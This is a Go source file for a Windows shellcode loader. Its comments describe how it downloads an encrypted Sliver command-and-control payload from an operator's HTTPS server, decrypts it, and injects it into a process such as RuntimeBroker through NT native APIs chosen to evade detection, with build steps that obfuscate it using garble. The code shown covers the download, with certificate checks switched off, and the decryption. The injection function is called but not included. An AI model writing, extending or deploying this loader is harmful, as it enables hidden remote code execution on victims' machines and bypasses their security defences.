//go:build windows && amd64

// Loader fetches an encrypted Sliver shellcode payload over HTTPS, decrypts it
// with ChaCha20-Poly1305, and injects it into a host process via NT native APIs.
//
// Key/URL are baked in at compile time via -ldflags:
//
//	-X main.PayloadURL=https://...
//	-X main.KeyHex=<64 hex chars>    (32-byte ChaCha20 key)
//	-X main.NonceHex=<24 hex chars>  (12-byte nonce)
//
// Injection chain (all NT-native, no Win32 VirtualAlloc/CreateThread fingerprint):
//  1. Fetch ciphertext over HTTPS (operator self-signed cert; AEAD guards integrity)
//  2. ChaCha20-Poly1305 decrypt — silent exit on tamper
//  3. Find or spawn host process (RuntimeBroker → SgrmBroker → WerFault → notepad)
//  4. NtAllocateVirtualMemory(host, RW) — never RWX
//  5. NtWriteVirtualMemory  — copy shellcode
//  6. NtProtectVirtualMemory(host, RX)
//  7. NtCreateThreadEx(host, entry) — shellcode runs in host's context
//
// Build with garble for full symbol + string obfuscation:
//
//	GOOS=windows GOARCH=amd64 garble -literals build -ldflags "..." -o loader.exe .
package main

import (
	"crypto/tls"
	"encoding/hex"
	"io"
	"net/http"

	"golang.org/x/crypto/chacha20poly1305"
)

// Injected by crystalkit inject (or manually via -ldflags).
var (
	PayloadURL = ""
	KeyHex     = ""
	NonceHex   = ""
)

func main() {
	key, err := hex.DecodeString(KeyHex)
	if err != nil || len(key) != chacha20poly1305.KeySize {
		return
	}
	nonce, err := hex.DecodeString(NonceHex)
	if err != nil || len(nonce) != chacha20poly1305.NonceSize {
		return
	}

	ct, err := fetchPayload(PayloadURL)
	if err != nil || len(ct) == 0 {
		return
	}

	aead, err := chacha20poly1305.New(key)
	if err != nil {
		return
	}
	shellcode, err := aead.Open(nil, nonce, ct, nil)
	if err != nil {
		// Decryption failure → tampered payload or wrong key; silent exit.
		return
	}

	injectShellcode(shellcode)
}

func fetchPayload(url string) ([]byte, error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			//nolint:gosec // self-signed operator cert; payload integrity via ChaCha20-Poly1305 AEAD
			InsecureSkipVerify: true,
		},
	}
	resp, err := (&http.Client{Transport: tr}).Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}
